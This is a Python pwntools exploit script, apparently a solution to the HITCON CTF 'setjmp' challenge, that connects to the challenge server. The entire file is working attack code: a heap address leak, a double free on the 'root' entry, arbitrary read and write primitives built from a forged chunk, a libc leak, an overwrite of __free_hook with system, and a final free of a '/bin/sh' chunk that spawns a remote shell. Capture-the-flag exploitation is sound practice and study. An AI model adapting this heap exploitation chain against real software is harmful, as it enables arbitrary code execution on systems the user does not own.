from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './run'
HOST = 'setjmp.chal.hitconctf.com'
PORT = 1337

#r = process(TARGET)
r = remote(HOST, PORT)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def reset():
    r.sendlineafter(b'> ', b'1')

def nw(name, pw, nocr=False):
    r.sendlineafter(b'> ', b'2')
    if not nocr:
        r.sendlineafter(b' > ', name)
        r.sendlineafter(b' > ', pw)
    else:
        r.sendafter(b' > ', name)
        r.sendafter(b' > ', pw)

def dl(name):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b' > ', name)

def change(name, pw, nocr=False):
    r.sendlineafter(b'> ', b'4')
    if not nocr:
        r.sendlineafter(b' > ', name)
        r.sendlineafter(b' > ', pw)
    else:
        r.sendafter(b' > ', name)
        r.sendafter(b' > ', pw)
def view():
    r.sendlineafter(b'> ', b'5')


# get heap leak
nw(b'aaaa', b'bbbbbbbb')
view()
r.recvuntil(b'b'*8)
leak = u64(r.recvuntil(b'\n', True).ljust(8,b'\x00'))
heap = leak - 0x370
dbg('heap')

nw(b'AAAA', b'BBBB')
nw(b'CCCC', b'DDDD')

# push 2 chunk to tcache
dl(b'aaaa')
dl(b'CCCC')
reset()

# delete root chunk twice to trigger double free
dl(b'root')
view()
leakname = r.recvuntil(b': ', True)
change(leakname, b'abab')
dl(leakname)

# build aar/w
fake_root = heap + 0x5b0

nw(p64((fake_root)), b'1111', nocr=True)
nw(b'1111', b'2222') # victim
nw(p64(fake_root-0x10), p64(fake_root-0x10), nocr=True) # fake_root

def aaw(where, what, prev_value=0):
    change(p64(fake_root), p64(where-8), nocr=True)
    change(p64(prev_value), p64(what), nocr=True)

def aar(where, prev_value=0):
    aaw(where+0x18, fake_root, prev_value)
    change(p64(fake_root), p64(where), nocr=True)
    view()
    r.recvuntil(b'\n')
    r.recvuntil(b'\n')
    return r.recvuntil(b'\n', True).split(b': ')

# place fake chunk
aaw(heap+0x398, 0x421)
aaw(heap+0x398+0x420, 0x21)
aaw(heap+0x398+0x420+0x20, 0x21)

# forge fake.prev, fake.next
aaw(heap+0x3a8, 0xbeef) # overwrite key to fixed value
aaw(heap+0x3b0, heap+0x5a0, 0xbeef)
aaw(heap+0x3b8, heap+0x370, heap+0x5a0)

# point to fake chunk
change(p64(fake_root), p64(heap+0x3a0), nocr=True)

# free 
dl(b'\x00')

# get libc leak 
leak = u64(aar(heap+0x3a0)[0].ljust(8, b'\x00'))
dbg('leak')
base = leak -0x1ecbe0
dbg('base')
fh = base + 0x1eee48
system = base + 0x52290

# rip control using free_hook 
aaw(fh, system)
chunk_to_free = heap + 0x100
waste = heap + 0x200 # somewhere writable
aaw(chunk_to_free+0x10, waste) 
aaw(chunk_to_free+0x18, waste)
aaw(chunk_to_free, u64(b'/bin/sh\x00'))

change(p64(fake_root), p64(chunk_to_free), nocr=True)
dl(b'/bin/sh\x00')

r.interactive()
r.close()
